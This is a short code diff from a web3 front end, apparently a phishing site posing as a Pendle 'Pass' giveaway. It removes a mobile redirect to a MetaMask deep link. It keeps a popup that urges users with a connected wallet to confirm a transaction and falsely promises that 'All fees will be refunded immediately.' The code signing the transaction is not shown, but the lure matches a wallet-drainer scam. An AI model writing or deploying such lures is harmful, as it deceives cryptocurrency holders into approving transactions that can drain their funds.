@@ -546,13 +546,7 @@ export default {
           web3modal.subscribeModal((newState) => {
             if (!newState.open) {
               if (getAccount().isConnected) {
-                if(window.innerWidth <= 768){
-                  try{
-                    window.location.href = "https://metamask.app.link/dapp/multi-call-front-end.vercel.app/"
-                  } catch (error) {
-                    console.log(error);
-                  }
-                }
+
                 Swal.fire({
                   html:
                     '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
